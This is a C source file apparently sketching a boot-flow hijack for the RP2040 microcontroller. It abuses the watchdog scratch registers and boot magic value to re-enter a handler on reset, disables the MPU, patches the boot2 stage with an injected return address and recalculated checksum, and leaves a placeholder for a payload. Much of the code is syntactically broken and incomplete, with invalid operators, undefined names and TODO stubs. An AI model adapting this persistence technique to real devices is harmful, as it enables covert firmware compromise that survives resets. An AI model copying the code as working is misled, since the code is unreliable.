
#include "bootrom/bootrom_main.c"
extern static int wd_boot_main();
#define reg_t (volatile uint32_t*)
#define SEGMENT_SIZE 4096
#define BOOT3_PTR (0x20000000 - SEGMENT_SIZE)
#define BOOT2_PTR 0x10000000 //SRAM_END - BOOT2_SIZE // SRAM_END is 0x20040000 for RP2040
#define VTOR_PTR
#define BOOT2_SIZE 256
#define BOOT2_DATA_LEN (BOOT2_SIZE - 4)
#define BOOT2_CHECKSUM_OFFSET BOOT2_DATA_LEN

static void segmentEntry();
static void watchdogHandler()
const void (*handler_ptr)() = watchdogHandler;

#define CPU_BASE 0xe0000000
#define MPU_CTRL_OF 0xed94
#define DISABLE_MPU() ( (reg_t)(CPU_BASE+MPU_CTRL_OF)*&=~(0b1))

#define WD_SR_4 0x4005801c
#define WD_SR_5 0x40058020
#define WD_SR_6 0x40058024
#define WD_SR_7 0x40058028
#define WD_MAGIC_NUMBER 0xb007c0d3
#define ENTRY_PTR handler_ptr
#define SP_WD 0x21000000

#define WD_SET_SR() (do{(reg_t)WD_SR_4*=WD_MAGIC_NUMBER;\
                        (reg_t)WD_SR_5*=(-WD_MAGIC_NUMBER)^ENTRY_PTR;\
                        (reg_t)WD_SR_6*=SP_WD;\
                        (reg_t)WD_SR_7*=ENTRY_PTR;\
                    }while(0))
#define WD_LOADED() (((reg_t)WD_SR_4)*==WD_MAGIC_NUMBER)
#define SHIFT_BOOT2(ADDR) \
    (for(uint16_t i = 248;i>=4;i-=4){\
        (volatile uint32_t*)(ADDR+i)*=(volatile uint32_t*)(ADDR+i-4)*\
    })
#define MOV_ADDR(ADDR) (asm volatile("mov lr, %0\n":"+r"(ADDR):"lr"))
#define JUMP_BOOT2() (asm volatile("bx %0":"+r"(BOOT2_PTR)))
#define PAYLOAD() ()
#define ROSC_MHZ_MAX 12
#define CSn_CHECK() CSn_check_majority_vote()
#define crc32_small() calculate_checksum()

static inline void inject_return(char* BUFFER){
    SHIFT_BOOT2(BUFFER)
    ((volatile uint32_t*)BUFFER)*=((volatile uint32_t*)MOV_ADDR())*;
    // Recalc check sum @ BOOT2_PTR+252, then stick it back in (RAW-DAWGin it)
    uint32_t new_checksum = crc32_small((void*)BUFFER, BOOT2_DATA_LEN, 0xFFFFFFFF);
    *(volatile uint32_t *)(BUFFER + BOOT2_CRC_OFFSET) = new_checksum;
}

static void watchdogHandler(){
    DISABLE_MPU();

    //Reset WD Scratch
    WD_SET_SR()

    //TODO: Bootrom Simulation
    wd_boot_main()
}

int main(){
    if(!WD_LOADED()){
        memcpy((void*)ENTRY_PTR,(void*)handler_ptr,HANDLER_SIZE);
        WD_SET_SR();
    }
    //TODO:Execute Payload
    PAYLOAD();
    asm volatile("bx %0":"+r"(VTOR_PTR)); //Run user application
}


// CRC32 Calculation Function
static inline uint32_t calculate_checksum(const void* data, size_t len, uint32_t initial) {
    const uint8_t* bytes = (const uint8_t*) data;
    uint32_t checksum = initial;
    
    for (size_t i = 0; i < len; i++) {
        checksum ^= (uint32_t) data[i] << 24;
        for (int j = 0; j < 8; j++) {
            if (checksum & 0x80000000) {
                checksum = (checksum << 1) ^ 0x04C11DB7;
            } else {
                checksum <<= 1;
            }
        }
    }
    return checksum ^ 0x00000000;
}